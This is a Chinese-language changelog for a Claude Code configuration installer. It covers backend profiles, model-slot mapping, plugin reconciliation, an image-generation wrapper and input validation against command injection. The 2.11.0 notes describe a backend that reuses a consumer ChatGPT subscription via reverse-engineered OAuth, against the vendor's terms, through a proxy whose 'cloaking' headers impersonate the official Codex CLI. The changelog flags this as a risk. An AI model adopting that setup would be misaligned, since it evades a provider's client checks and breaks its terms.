- **`profiles/glm.json` 的 fable 映射到 `glm-5.2`，`profiles/gpt.json` 映射到 `gpt-5.6-luna`。** 两者都补齐了其他槽位已有的 `_NAME` / `_DESCRIPTION` / `_SUPPORTED_CAPABILITIES` 三件套，`/model` 里的描述保持一致。
- **`claude.zsh` 认识这个槽位了。** `fable` 加入了 `slot_var` 查表和已解析模型的输出，`--model fable` 现在和其他三个别名行为一致，而不是被原样透传。

### 新功能
- **ccr 槽位选择器会询问 `fable`。** `configure_ccr_profile` 从三个槽位变成四个，`ANTHROPIC_DEFAULT_FABLE_MODEL` 也加进了 `profiles/ccr.json` 的 `credentialKeys`，因此安装脚本写入的值能像其他三个一样在后续模板刷新中保留。
- **非原生后端上槽位为空时，启动阶段会警告。** 当 `ANTHROPIC_BASE_URL` 已设而 `ANTHROPIC_DEFAULT_FABLE_MODEL` 为空时，`cl_*` 会打印一行提示 —— 否则这个故障在会话内部根本无法诊断。

### 设计理由
- **`fable` 的提示语和其他三个不同，"跳过也没问题"那段话不再覆盖它。** `opus` 留空是可恢复的：`claude.zsh` 会故意不传 `--model`，用户进去用 `/model` 从发现列表里挑。fable 没有这个退路 —— Claude Code 根本不会把它放进 `/model`，所以 fable 留空不是"待会儿再选"，而是每一条后台请求都必定 400。提示语标注了 `NOT recommended`，跳过时会警告而不是静默通过。
- **槽位列表现在是推导出来的，不再是逐个列举。** `claude.zsh` 只保留一个 `_CL_MODEL_SLOTS` 数组，用 `ANTHROPIC_DEFAULT_${(U)slot}_MODEL` 推导变量名，替换掉原来两处并行的 `case`；`configure_ccr_profile` 把环境变量名放进和槽位并行的 `slot_vars` 数组，`jq` 过滤器在循环里拼出来，而不是每个槽位手写一个 `--arg`。漏掉某个 `case` 分支正是 fable 槽位潜伏三个版本的原因，现在加第六个槽位在每个文件里都只是改一个词。

### 注意事项
- **变量确实决定出站 model id，这一点已证明；它专门修好"后台请求"则仍是推断。** 直接证据：槽位映射好之后，`claude -p --model fable` 打到 CCR 网关，产生的那条请求 `requested_model` 是 `Zhipu AI (China) - Coding Plan/glm-5.2`，状态 200 —— 说明 `ANTHROPIC_DEFAULT_FABLE_MODEL` 确实把 `fable` 别名解析成了映射后的 id，而不是 `claude-fable-5`。这一轮没有直接覆盖到的是后台路径：`claude -p` 根本不产生后台流量（已验证，整轮只有一条前台请求），而 CCR 在诊断和修复之间轮转了请求日志表，原来的前后对比无法重跑。推断依据是：后台请求和显式 `--model fable` 走的是同一套槽位解析。**收尾方法：用 `cl_ccr` 跑一个交互会话，触发 `/compact`，确认产生的后台请求用的是映射后的 id。**
- **`fable` 确实是一个可解析的 `--model` 别名** —— 上面那轮已证实，所以启动器槽位查表里的 `fable` 分支是活代码，不是死代码。本条目的早期草稿写的是 Claude Code"永远不会把 fable 放进 `/model`"，那是说过头了，全文已更正。准确的说法、也是这个槽位仍然必须映射的原因是：Claude Code 会在**用户从未选择它**的情况下拿 fable 槽位发后台请求，所以留空是在你没主动发起的流量上失败。
- **无自动化测试覆盖**（`tests/` 已在 `68f30f8` 移除）。手工验证覆盖到的：把选择循环从 `configure_ccr_profile` 逐字抽出，在系统 bash 3.2.57 下跑了全选 / 跳过 fable / 首个提示处 EOF / 前导零四种输入；`jq` 写入用真实 `profiles/ccr.json` 试过，id 里带空格、斜杠、内嵌双引号和中日韩字符，全部逐字节还原。这个过程发现并修掉了两个真实缺陷：裸 `read` 会让 Ctrl-D 在 `set -e` 下直接中止整个安装脚本（现改为 `|| choice=""`），以及像 `08` 这样的前导零输入会先打印一条原始 bash 算术错误再走友好警告（现改为 `10#$choice`）。这两个缺陷早于本版本，原来的三个槽位同样中招。`bash -n install.sh`、`zsh -n claude.zsh`、四个 profile 的 `jq -e .`、`install.sh --dry-run`（exit 0）全部通过；zsh 的槽位推导对 `opus`/`sonnet`/`haiku`/`fable`/未知别名/空串六种输入与旧 `case` 逐一比对，行为一致。
- **从 pre-baseline 安装升级时，会出现一条误导性的"hand-edited fields, now reset"警告**，点名 `env.ANTHROPIC_DEFAULT_FABLE_MODEL`。在 `profiles/.baseline/` 出现之前装的 `glm.json` / `gpt.json` 会和新模板比对，而新模板多了用户副本没有的 fable 键。数据不会丢（会写备份，合并结果也正确），但警告本身是误报。
- **同一批日志里还有另一个无关的故障模式，本次并未修复。** 有 5 条 400 来自 CCR 的 Anthropic→Responses 转换，它生成了 `content` 数组非空的 `reasoning` item —— `Invalid 'input[1].content': array too long. Expected an array with maximum length 0` —— 发生在历史里带着 `thinking` 块、但对目标模型没有有效 encrypted reasoning 载荷的时候。那是 claude-code-router 的 bug，不是本仓库的；profile 层面没有任何设置能规避。
- **`install.ps1` 根本不填模型槽位**，所以这次不需要改它 —— 但这也意味着 Windows 路径从来就没有、现在也依然没有 ccr 槽位映射这一步。

## [2.17.0] - 2026-08-02

### 移除
- 在不变更 2.17.0 版本号的前提下，停用 Matt Pocock Skill 集合、`frontend-design` 插件目录项和 vendored `harness-workflow` Skill。早期版本曾引入这些集成，2.17.0 是其正式退役版本。
- Bash 与 PowerShell 保持升级清理一致：旧 Matt ownership manifest 仅删除其中记录的安全单层目录；原 frontend 插件 ID 仅保留为 retired/removed tombstone；harness 仅在摘要与旧托管内容完全一致时删除，修改过或用户自建的同名副本会保留。


### 新功能
- **通过网络安装的 `image-gen` Skill（`sinedied/agent-skills`），始终安装。** 两个安装器现在都会通过网络拉取上游 `image-gen` Skill，命令为 `npx -y skills@latest add sinedied/agent-skills --global --agent claude-code --copy --yes --skill image-gen` —— 本仓库**不**追踪上游的 `image_gen.py`、提示词、示例或 license。安装是无条件的：在每种模式下都会运行（交互式、`--all` / `-All`、`--essential` / `-Essential`，即使所有可选项都被取消勾选），且没有为它新增菜单开关。仓库自有的 Bash 包装器（`scripts/image-gen-cliproxyapi.sh`）被安装到 `~/.claude/scripts/` 并注册为用户脚本；下载下来的 `SKILL.md` 会通过受管标记做幂等注入。
- **安全的 CLIProxyAPI 委派包装器。** `~/.claude/scripts/image-gen-cliproxyapi.sh` 在环回地址 `http://127.0.0.1:8317/v1` 上启动或复用 CLIProxyAPI，要求 **CLIProxyAPI >= v7.2.17**（仅稳定版；所有预发布后缀都被拒绝），从 `~/.cli-proxy-api/config.yaml` 读取本地 client key（**绝不**打印/日志/放进 argv），注入仅作用于子进程的 `OPENAI_*` 变量，然后把原始参数委派给上游 `image_gen.py`。图像模型固定为 `gpt-image-2`。`/healthz` 仅作为存活探针；包装器额外执行一次鉴权过的 `GET /v1/models` 能力探针（key 通过 curl `--config -` stdin 传入，绝不在 argv），要求精确匹配 `data[].id == "gpt-image-2"`，并在超时内无法证明能力时 fail-closed。
- **所有权安全的安装、升级与卸载。** 只有当包装器存在、上游布局校验通过、且注入成功后，才会写入模式 600 的清单（`~/.claude/.image-gen-sinedied`）。所有权要求三者同时满足：逐字节匹配的标准清单、目录布局、**以及** `SKILL.md` 中格式正确的注入标记。`--uninstall` 仅在所有权完整证明时才删除 `~/.claude/skills/image-gen`；同名但用户自建/残留的目录会被保留，仅清理过期清单。已拥有的旧版本在升级前会被备份（校验非空），任何后续失败都按字节恢复。
- **启动器独立性。** `claude.zsh` 经过 grep 审计，不含任何 image-gen / `OPENAI_*` 耦合。所有 `cl*` / `cl_*_auto` 启动器都流经同一组全局 `~/.claude/skills/` 和 `~/.claude/scripts/` 路径；恶意或不兼容的 `ANTHROPIC_BASE_URL` 永远不会改变子进程的 `OPENAI_BASE_URL`（始终是环回常量）。图像生成可在任意后端下工作，并绕过当前启动器拉起的那个代理。
- **双语文档同步更新。** `README.md` / `README.zh-CN.md` 把 image-gen 列为始终安装的网络 Skill（区别于 vendored 的 `skills/`），并补上 `scripts/` 目录树条目。`docs/BACKENDS.md` / `docs/BACKENDS.zh-CN.md` 文档化网络来源、确切的 `gpt-image-2` 模型、最低版本 `v7.2.17`、`/healthz` 存活探针 vs 鉴权过的 `/v1/models` 能力就绪、`/v1/images/generations` + `/v1/images/edits` 路由、包装器/配置路径、本地 key 与 OAuth 的边界、所有启动器行为、直连 8317 端口、手动 `cliproxyapi --codex-login` / `brew upgrade cliproxyapi`、所有权安全的卸载，以及"无需 OpenAI Platform key"的规则。

### 设计理由
- **网络安装，绝不 vendored。** `npx skills add` 让上游的 `image_gen.py`、提示词和 license 都不进本仓库。`DO_NOT_TRACK=1` 关闭该 CLI 的匿名遥测；`--copy` 写真实文件（非 symlink）以便 `--uninstall` 能删除；`--agent claude-code` 仅安装到 Claude Code。失败（缺 `npx`、网络错误）是非致命的 —— 计一条警告并返回，让版本戳和其余安装继续完成。
- **Fail-closed 能力探针。** `/healthz` 返回绿色并不能说明 OAuth 已加载或上游可达（监听端口一绑定它就返回 200）。鉴权过的 `/v1/models` 探针补上了这块：若无法证明 `gpt-image-2`，包装器会打印一条净化过的诊断（`OAuth/login may be inactive - run \`cliproxyapi --codex-login\` and retry`）并退出、**不**委派，避免配置错误的代理伪装成就绪。精确 id 匹配（`data[].id == "gpt-image-2"`）可挡住仅子串匹配的响应。
- **所有权 = 清单 + 布局 + 标记，而不是仅看清单。** 即使用户手建一个 `skills/image-gen/` 目录并塞进一份残留的有效清单，也不会被误删：删除要求 installer 只在注入成功后才写入的标记。逐字节的标准清单校验（单一标准字面量）会拒绝重排、重复/多余行、CRLF 以及缺少末尾换行。
- **密钥安全与启动器一致。** 代理 key 仅 `export` 进委派子进程的环境；处理机密前后会禁用/恢复 xtrace；Authorization 头通过 curl `--config -`（stdin）传入，故 key 绝不进 argv。模型从一个独立的不可变常量（`IMAGE_GEN_DEFAULT_MODEL`）注入，父 shell 即便 `export IMAGE_GEN_MODEL=...` 也无法污染子进程。

### 注意事项
- **不支持原生 Windows 运行时。** 包装器是 Bash 脚本，CLIProxyAPI 服务生命周期仅支持 Bash/Zsh。`install.ps1` 在 Windows 上会安装网络 Skill 和包装器资产，但 `cl_*` / CLIProxyAPI 的图像生成在 Windows 上**不**受支持；请在 **WSL 内**运行 Bash 安装器，使其落到 WSL 的 `~/.claude`（WSL 不会把 `%USERPROFILE%\.claude` 当作 `~/.claude`；Git Bash 的 home 映射取决于具体安装）。本次会话**未**验证真实的 PowerShell 运行时行为 —— 当 `pwsh` 不存在时行为测试会干净地 SKIP，pwsh-equipped 的 Windows 机器需自行确认解析器、`cmd.exe /d /s /c` 调用 `npx.cmd`、字节级 `SKILL.md` 注入、以及清单原子性。
- **能力探针依赖真实的 `/v1/models` 契约。** 精确 id 匹配假设 CLIProxyAPI `>= v7.2.17` 在 `data[].id` 中暴露 `gpt-image-2`；本次会话未对照真实二进制验证（测试环境里没有）。若上游 schema 真的发生变化，探针可能无法定论；Task 9 应予以确认。
- **清单文件模式仅 Unix 有效。** Windows 没有 `chmod 600`；PowerShell 安装器通过 `[System.IO.File]::WriteAllBytes`（UTF-8、无 BOM、精确 LF）写入清单，所有权以逐字节的内容校验为准，而非文件模式。
- **`IMAGE_GEN_CLIPROXYAPI_BASE_URL` 是仅测试用的 override**，超出计划原本的五个环境变量；生产环境的 base URL 是确切的常量 `http://127.0.0.1:8317/v1`，绝不从 health URL 推导。
- **`CHANGELOG.zh-CN.md` 缺 2.14–2.16。** 本条目是在已经滞后的中文更新日志（最后一条为 2.13.0）之上新增 2.17.0。回填 2.14–2.16 的中文条目不在 Task 8 范围内，留给单独的一次处理。
- **不提交、不分支、不推送、不创建 worktree。** 编辑直接叠加到 `main` 的工作树。

## [2.13.0] - 2026-07-31

### 新功能
- **安装器最难懂的两个「下一步」现在是分步 + 中英对照的。** 第 4 步（完成后端配置）对每个待配置 profile 打印带编号的 `install / 登录 / 密钥 / 详细步骤` 区块，取代原来三行没有标号的提示；第 5 步（飞书 MCP）把从建应用到验证连接的整条路径全部列出，每一行中英各一句。
- **新增 `docs/LARK-MCP.md` 与 `docs/LARK-MCP.zh-CN.md`** —— 覆盖开发者后台导航、权限模型、应用身份 vs 用户身份、工具预设，以及各种失败模式。
- **新增 `docs/BACKENDS.zh-CN.md`** —— `docs/BACKENDS.md` 的完整中文镜像；后者本身也把 `ccr` 和 `gpt` 两节重写成了带真实 UI 标签、端口和路径的分步教程。
- **飞书 MCP 现在带 `-t preset.light` 注册。** 不写 `-t` 时包会暴露 `preset.default`，而上游 FAQ 自己就把「启动 MCP 服务后提示 token limit exceeded」列为已知问题，给出的解法正是这个参数。预设值集中在 `LARK_MCP_PRESET` 一个全局变量里。
- **`scripts/check-readme-sync.sh` 的链接检查现在是真的在跑。** 它原本用 `grep -oP`，而 BSD grep 没有 `-P`，所以在 macOS 上该命令直接报错，`wc -l` 数到空输出，`0 == 0` 无条件通过。改写成 ERE 后，现在真实比对两侧各 51 条链接。

### 设计理由
- **选择把 `--config` 写进文档，而不是删掉它。** `profiles/gpt.json` 传的是 `--config "$HOME/.cli-proxy-api/config.yaml"`，配上 `brew install` 的安装提示看着像个 bug —— 因为 Homebrew 通过 ldflag 把默认配置烤成了 `$(brew --prefix)/etc/cliproxyapi.conf`。读完配置解析链才定论：省掉 `--config` 对 Homebrew 安全，对源码编译不安全（会退化成 `$CWD/config.yaml`），对 AUR 无法验证。显式传参在四种情况下都正确，所以参数保留，改由文档告诉你去创建那个确切的文件。
- **修正了旧 `ccr` 文档的两处错误。** v3 既没有 `ccr status` 也没有 `ccr restart`；v1 那套 `default` / `background` / `think` / `longContext` 路由块已经不存在。文档现在也改为让你直接选内置预设 `Zhipu AI (China) - Coding Plan`，而不是手敲 endpoint，并标明 Agent Profiles 是可选的 —— 我们的启动器自己设置 `ANTHROPIC_BASE_URL`，根本不用它。
- **安装器的文档指引不带 `#anchor`。** GitHub 会把 ``### `ccr` — one /model list…`` 转成 `#ccr--one-model-list-across-providers`，所以拼出来的 `#ccr` 会 404。指引只给文件名。

### 注意事项
- **CLIProxyAPI 是 fail open 的，文档现在用粗体写明了这一点。** 如果 `api-keys` 为空或缺失，它会直接注销鉴权 provider，此后每个 `/v1/*` 路由接受任何请求 —— 任意 token，或者干脆没有 token。再叠加默认的 `host: ""` 绑定全部网卡，按旧那三行说明配置、又跳过填 key 那步的用户，等于在局域网上挂了一个不需要鉴权、直通自己 ChatGPT 订阅的代理。现在文档给出的配置把这两项都显式设死。
- **`/healthz` 是存活探针，不是就绪探针。** 它确实存在且无需鉴权，但只要监听端口起来就返回 200，与凭证是否加载无关。健康检查通过而请求全失败，说明登录那步没生效。
- **`@larksuiteoapi/lark-mcp` 已经一年没更新**（`0.5.1`，2025 年 8 月），且自己仍标注为 beta。文档锁定版本号正是因为这个。
- **Windows 侧无对应改动。** `install.ps1` 不含 shell wrapper、不含 profiles、也不注册 MCP，因此这批改动没有需要同步的 PowerShell 面。

## [2.12.0] - 2026-07-31

### 新功能
- **glm-5.2 的 1M 上下文这次是真的能用了。** `profiles/glm.json` 新增 `CLAUDE_CODE_MAX_CONTEXT_TOKENS=1000000`、`CLAUDE_CODE_AUTO_COMPACT_WINDOW=1000000`、`CLAUDE_CODE_MAX_OUTPUT_TOKENS=128000`。此前 profile 的模型描述里写着 "1M"，而 Claude Code 实际按 200K 跑，输出还被压在 32K。
- **用户自己传的 `--model` 不再被覆盖。** `claude.zsh` 把 `--model opus` 硬编码进 `extra_args`，并且拼在 `"$@"` **之后**，导致 `cl_glm --model glm-5-turbo` 仍然启动 glm-5.2。现在启动器会扫描调用方参数里的 `--model` / `--model=X`，只有在没有时才注入默认值。
- **不改 JSON 也能选模型。** 单次启动用 `cl_<backend> --model <别名|精确 id>`，或用 `CL_MODEL=<别名> cl_<backend>` 改这一次的默认别名。视觉模型也走这条路：`cl_glm --model glm-5v-turbo`。
- **每次启动都打印后端与解析后的模型**，包括此前完全静默的原生 `claude` 路径，以及不注入任何变量的 profile。别名会打印成解析后的形式（`model opus -> glm-5.2`），取值来自 profile 自己的 `ANTHROPIC_DEFAULT_*_MODEL`。
- **安装器每次运行都会重新检查 `.zshrc` 的 source 行。** 如果不是首次安装却依然找不到 `source ~/.claude/claude.zsh`，现在会**显著告警**：说明用户 shell 里从来就没有过任何 `cl*` 命令，而不是把同一条首次运行的温和提示再念一遍。安装器仍然从不修改任何 shell rc 文件。

### 设计理由
- **`CLAUDE_CODE_MAX_CONTEXT_TOKENS` 是官方留的唯一逃生口。** Claude Code 的 context resolver 对任何非 `claude-*`、不匹配 `/\[1m\]/i`、又不在内置注册表里的 model id 一律返回硬编码的 200000 —— 所有 `glm-*` 都是这种情况。而这个环境变量恰恰只在 model id 不以 `claude-` 开头时生效。`[1m]` 后缀方案被否决：`glm-5.2[1m]` 不是智谱的模型代号，会被原样发到线上。
- **两个上下文变量缺一不可。** 自动压缩窗口是 `min(contextLimit, CLAUDE_CODE_AUTO_COMPACT_WINDOW)`，只改其中一个等于没改。
- **输出取 `128000` 而不是 `131072`。** 智谱文档写 glm-5.2 最大输出 128K，但客户端会把 `CLAUDE_CODE_MAX_OUTPUT_TOKENS` 钳到 128000，字面量 131072 会被静默削掉。128000 是能存活的最大值。
- **一个 profile 加一条明确警示，而不是拆成两个 profile。** 见下 —— 多加一个 `glm-200k` profile 意味着安装器条目、baseline、迁移、文档全部翻倍，只为防一个仅在非默认 slot 上超过 200K 才会触发的问题。
- **`--model` 是解析出来的，不是位置参数。** `claude` 的第一个位置参数可以是 prompt，把 `cl_glm <name>` 当成模型名会直接破坏 `cl_glm "写首俳句"`。沿用 claude 自己的参数不需要用户学新东西，"改默认" 的需求由 `CL_MODEL` 覆盖。

### 注意事项
- **一个上下文上限，三个模型。** `CLAUDE_CODE_MAX_CONTEXT_TOKENS` 是客户端全局值，不分 slot。设成 glm-5.2 的 1M，是因为 glm-5.2 既是 opus slot 也是启动器默认。sonnet（`glm-5-turbo`）和 haiku（`glm-4.7`）都是 200K，路由到它们时客户端会让上下文涨过服务端能接受的长度，而自动压缩已被解除武装。这一点写在 profile 的 `note`、三条 `..._MODEL_DESCRIPTION` 以及 `docs/BACKENDS.md` 里。实际使用中 haiku slot 只承担很短的后台任务。
- **没有给 `glm-5v-turbo` 新增 slot。** Claude Code 只暴露 haiku/sonnet/opus 三个 slot，且已全被 Coding Plan 的三个模型占满。视觉模型通过 `--model glm-5v-turbo` 触达，而不是挤掉其中一个。
- **已有安装会自动获得新的环境变量。** `install_profiles` 整体采用模板、只回填 `credentialKeys`，所以下次运行时三个新变量会带着原有 API key 一起到位。手工改过的 `glm.json` 仍会被备份并列出被重置的字段。
- **Windows 侧无对应改动。** `install.ps1` 从未包含 shell wrapper 和 profiles —— grep `glm` 零命中 —— 因此没有需要同步的 PowerShell 面。

## [2.11.0] - 2026-07-31

### 新功能
- **后端变成数据，不再是代码。** `glm-env.json` 由 `~/.claude/profiles/*.json` 取代 —— 每个后端一个文件，声明 `{label, credentialKeys[], service, unset[], env{}}`。`claude.zsh` 在 source 时扫描该目录，为找到的每个 profile 生成 `cl_<name>` / `cl_<name>_auto`，因此新增后端 = 丢一个 JSON 文件。新增 `cl_profiles`（列出后端及就绪状态），`cl_switch` 改为只提供实际已安装的 profile。
- **内置四档后端。** `claude`（原生 OAuth）、`glm`（智谱 Coding Plan）、`gpt`（ChatGPT 订阅经本地 CLIProxyAPI :8317）、`ccr`（claude-code-router 网关 :3456，通过 `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY` 把所有已配置 provider 合并进同一个 `/model` 列表）。
- **按需的代理进程生命周期。** profile 可声明 `service`；启动器先做健康检查，仅在未运行时后台拉起，等待就绪，日志写入 `~/.claude/logs/`，已健康则直接复用。二进制缺失时拒绝启动并打印安装与登录命令，而不是让请求在 Claude Code 内部失败。
- **安装器新增菜单组「Model Backends」**（`backend-glm` / `backend-gpt` / `backend-ccr`，默认全开）及 `docs/BACKENDS.md`。
- **修正 GLM 模型映射。** 原为 `glm-4.7-flash`/`glm-5`/`glm-5.2`，现为 `glm-4.7`/`glm-5-turbo`/`glm-5.2`。`glm-4.7-flash` 属免费线、不在 Coding Plan 套餐内；`glm-5` 在上游会自动路由到 `glm-5.2`，硬编码无意义。

### 设计考量
- **原有的 GLM 机制本来就是通用的，只是输入被写死了。** `_cl_glm_run` 做的事就是把一个 JSON 的所有 key 导出为环境变量、跑完精确还原。把它泛化成 `_cl_profile_run <name>` 代价很小，并消除了那三处让第三个后端无法存在的两态硬编码校验。
- **每次启动才注入 env，绝不写 `settings.json`。** 后端对机器上其他程序完全不可见，多个终端可同时跑不同后端，中断的会话也不会遗留网关 URL。`claude` 档额外*清除*网关变量，避免 `.zshrc` 里残留的 `ANTHROPIC_BASE_URL` 悄悄把 Claude 订阅会话改道。
- **`credentialKeys` 把合并方向反过来了。** 升级时以模板为准整体覆盖，只把 profile 自己声明为凭据的那几个 key 重新贴回去，于是模型默认值跟随仓库更新，而 API key 经得起任意次重装。
- **CCR 是第四档，而不是唯一入口。** CLIProxyAPI 自身已暴露 `/v1/messages`，所以 `gpt` 档直连即可、路径上不需要 CCR —— 常见场景少一个活动部件。CCR 只在真正需要它的地方出场：把多家 provider 合并成一个 `/model` 列表。

### 注意事项
- **`ccr` 档无法完全自动化。** CCR v3 的配置存在 `~/.claude-code-router/config.sqlite`，旧的 `config.json` 只在尚无 SQLite 配置的机器上被读取一次。provider、客户端 key、agent 配置档案必须在 `ccr ui`（`:3458`）里手动建一次。安装器能准备好这一步之外的所有事情，但代替不了这一步。
- **`gpt` 档是厂商不支持的路径。** 它通过逆向的 OAuth 流程复用消费级订阅；OpenAI 条款禁止把账号凭据交给第三方客户端，且 CLIProxyAPI 带有伪装 header、冒充官方 Codex CLI 的 "cloaking" 机制 —— 这强烈暗示 OpenAI 在校验客户端指纹。另外 Anthropic 官方文档明载：不支持通过任何网关把 Claude Code 路由到非 Claude 模型。`claude` 与 `glm` 两档不涉及这些风险。
- **迁移是自动且非破坏性的。** `~/.claude/glm-env.json` 会变成 `profiles/glm.json` 并保留凭据；旧文件改名为 `.migrated` 而非删除。若 profiles 目录整个不存在，`claude.zsh` 仍会回落读取旧的扁平文件。
- `--uninstall` 刻意保留 `~/.claude/profiles/` —— 里面是用户自己贴进去的 API key。
- Windows 侧未变：`install.ps1` 从来就没有 shell wrapper 和 GLM 后端，本次仍然没有。

## [2.9.0] - 2026-06-29

### 新功能
- **插件目录对账：安装器现在会按选择「裁剪」与「重装」。** 每次运行时，在计算出本次选择的插件后，两个安装器都会把本次选择与 `installed_plugins.json` 中实际已安装的插件进行对账：
  - **裁剪 (prune)** —— 若某插件属于安装器目录（`PLUGINS_ESSENTIAL` / `PLUGINS_OPTIONAL` / `PLUGINS_CLAUDE_MEM` / `PLUGINS_AI_RESEARCH` / `PLUGINS_PUA` 的并集）、已安装、但本次**未**选择，则会被 `claude plugin uninstall` 卸载。新增 `prune_unlisted_plugins()`（bash）/ `Remove-UnlistedPlugins`（PowerShell），在安装后立即运行，且仅在本次选择了插件步骤时触发。
  - **重装即更新 (reinstall = update)** —— 本次选择且已安装的插件改为「先卸载再重新安装」（而非 `claude plugin update`），以读取刚刷新的目录。
  - **保留 (preserve)** —— 已安装但**不**属于目录的插件（用户自己安装的第三方插件，如 `code-review@claude-plugins-official`）绝不会被改动。
- **纯函数、可单测的决策逻辑。** 裁剪决策被抽取为无副作用的 `compute_plugins_to_prune()`（外加 `build_plugin_catalogue()` / `plugin_is_installed()`），无需 `claude` CLI 或文件系统即可测试。
- **仓库首个测试框架。** 在 `tests/` 下新增纯 bash 测试框架（`tests/run.sh` 运行器 + `tests/test_plugin_resolution.sh`）—— 不依赖 `bats`。`install.sh` 末尾新增 source 守卫（`if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then main "$@"; fi`），使其可被测试 source 而不触发 `main`。

### 设计考量
- **以「先卸载再重装」作为更新机制**（而非 `claude plugin update`），可确保插件从刷新后的目录重新构建，避免更新不完整／陈旧状态。
- **目录归属即安全边界。** 仅安装器管理的插件才可能被裁剪；其余一律视为用户有意安装并予以保留。裁剪核心为纯函数，该边界可在测试中证明。
- **裁剪有双重防护，杜绝误删。** 仅当本次选择了插件步骤才会执行；且 `prune_unlisted_plugins()` / `Remove-UnlistedPlugins` 在 `RESOLVED_PLUGINS` 为空时会提前返回 —— 因为空选择（例如插件步骤运行但用户取消了全部勾选，`install_plugins` 解析出 0 个插件）否则会把所有已安装的目录插件标记为待删除。该「空选择」守卫有专门的测试覆盖。

### 注意事项
- `update_installed_plugins()` / `Update-InstalledPlugins` 现在会**跳过目录插件**（选中的刚重装、未选中的刚被裁剪），只对保留下来的第三方插件执行 `claude plugin update`，绝不会复活已被裁剪的插件。
- `prune_unlisted_plugins` 对缺失的 `claude` CLI / `jq` / `installed_plugins.json` 以及非法 JSON 做了防护，遇到则告警跳过而非中断安装。
- 既有的 `RETIRED_PLUGINS` / `prune_retired_plugins` 自愈行为保持不变。
- 兼容 bash 3.2（采用 `|entry|` 管道分隔的集合字符串，不使用关联数组）。
## [Upstream merge: 2.8.0] - 2026-06-29

### 功能
- **新增 `Slides` 分组，含两个 AI 演示文稿插件，默认全部关闭：** [`frontend-slides`](https://github.com/zarazhangrui/frontend-slides)（零依赖 HTML 幻灯片生成器，支持 PPT 转换）与 [`ppt-master`](https://github.com/hugohe3/ppt-master)（从 PDF/DOCX/URL/Markdown 生成可编辑 PPTX）。仅在 `--all` 或手动勾选时安装。
- **彻底移除 `everything-claude-code` 插件**：Workflow 菜单项、optional 插件组槽位、`affaan-m/everything-claude-code` marketplace、id→包名映射，以及 `settings.json` 条目。新增墓碑机制（`PLUGINS_REMOVED`）：升级时从用户 `enabledPlugins` 中剔除它，并在 `--uninstall` 时卸载，确保不残留。

### 设计理由
- **npx 而非 vendoring。** 通过 `skills` CLI 安装可避免仓库塞进 vendored skill 目录。`DO_NOT_TRACK=1` 关闭 CLI 的匿名遥测；`--copy` 写入真实文件（非 symlink），便于卸载删除；`--agent claude-code` 仅安装到 Claude Code。

### 注意事项
- `ppt-master` 需在其安装目录内执行 `pip install -r requirements.txt`，其 Python 后处理脚本才能工作。
- README 的插件 / marketplace / 内置 skill 计数相应更新为 25 / 10 / 5。

## [2.7.1] - 2026-06-09

### 新功能

### 注意事项
- `teach` 仅限用户主动调用（`disable-model-invocation: true` → `/teach`）；这里的「默认开启」指安装器选单中默认勾选，而非模型自动触发。
- 首个多文件内置 skill —— 由于 skill 目录是递归复制的（`cp -r` / `Copy-Item -Recurse`），无须改动任何安装器逻辑。
- 原作者归属以 HTML 注释形式保留在 `skills/teach/SKILL.md` 顶部。

## [2.7.0] - 2026-06-08

### 新功能
- **对 fork 友好的安装器：仓库元数据现在可配置**（#41，感谢 @Yastruhank）。`install.sh` 与 `install.ps1` 不再硬编码 `Mizoreww/awesome-claude-code-config/main`。owner、name、branch 改为从 `REPO_OWNER` / `REPO_NAME` / `REPO_BRANCH` 读取（默认回退到上游值），并拼接进每一处下载 URL —— tarball/zip 源、远程 `VERSION` 检查，以及 `Show-Help` 的远程安装一行命令。这样 fork 或镜像无须改动源码即可运行安装器（包括 `curl | bash` / `irm | iex` 远程形式）。

### 问题修复
- **校验仓库元数据覆盖值以防命令注入。** 远程模式下 `install.sh` 会用 `REPO_URL` 拼出下载命令并通过 `bash -c` 执行。新增的、由环境变量控制的 `REPO_OWNER`/`REPO_NAME`/`REPO_BRANCH` 现在会在使用前按安全字符集校验（`^[A-Za-z0-9._-]+$`，branch 额外允许 `/`），与既有的 `VERSION` 防护一致。远程 `version` 清洗逻辑也放行了 `/`，使 `feature/*` 分支可作为 `REPO_BRANCH` 覆盖值。
- **从 `permissions.allow` 移除无效的 `mcp__*` 通配符**：Claude Code 的 `/doctor` 会拒绝 *allow* 规则中裸写的 `mcp__*`。在 allow 规则里，通配符只能用于字面前缀 `mcp__<server>__` 之后的**工具位**（如 `mcp__github__*`）—— server 名段本身不能被通配。该条目此前被静默忽略，因此移除它行为等价（MCP 工具本就回退到 `auto` 权限提示）。若要预先放行 MCP 工具，请添加有效的按 server 条目，如 `mcp__github` 或 `mcp__github__*`。（deny/ask 规则仍允许任意位置使用通配符。）

### 设计取舍
- **每个字段一个覆盖变量，而非两个。** 贡献的 PR 同时提供了 `REPO_OWNER` 和并行的 `REPO_OWNER_OVERRIDE`（×3 字段、×2 脚本），且带有隐式优先级规则。已收敛为每字段单一变量 —— 能力不变，但消除了「哪个生效」的歧义。
- **在边界处校验。** 覆盖值跨越信任边界（环境变量 → shell 求值的 URL），因此在读取的那一刻即校验，与项目既有的输入校验立场一致。

### 注意事项
- PR 中实验性的 `--dry-run` 目录守卫已回退：它只覆盖了顶层 `$CLAUDE_DIR` 的 `mkdir`，而各组件安装器仍会在各自的 dry-run 检查之前创建子目录（并删除旧 skill）—— 因此会给人虚假的安全感。让 `--dry-run` 完全不产生副作用，作为单独的后续项跟踪。
- 两个脚本的注释式帮助块仍字面引用上游 URL；PowerShell 的 `<# … #>` 帮助是由 `Get-Help` 解析的静态文本，无法插值运行时变量。

## [2.6.1] - 2026-05-25

### 新功能

### 注意事项
- skill 会把交接文档写入用户操作系统的临时目录（如 `/tmp` 或 `%TEMP%`），不会污染当前仓库。
- 原作者归属以 HTML 注释形式保留在 `skills/handoff/SKILL.md` 顶部。

## [2.6.0] - 2026-05-22

### 新功能
- **`paper-reading` skill 新增 HTML 输出模式。** 当用户未指明时，skill 会先询问要 Markdown 总结（轻量、省 token，适合归档与再编辑）还是 HTML 总结（更好看、更费 token）。HTML 模式复用与 Markdown 完全相同的内容骨架（论文类型模板、深度优先写法、抽取的图表），但配以整洁的阅读排版，并在关键理解点处**手绘内联 SVG 示意图**（架构/流水线、算法流程、朴素 vs 改进方案对比）。新增 `Step 0: Choose Output Format` 作为流程入口；`HTML Output Mode` 小节说明页面骨架、可选的 MathJax（CDN 渲染公式）以及 SVG 绘图规范。

### 设计取舍
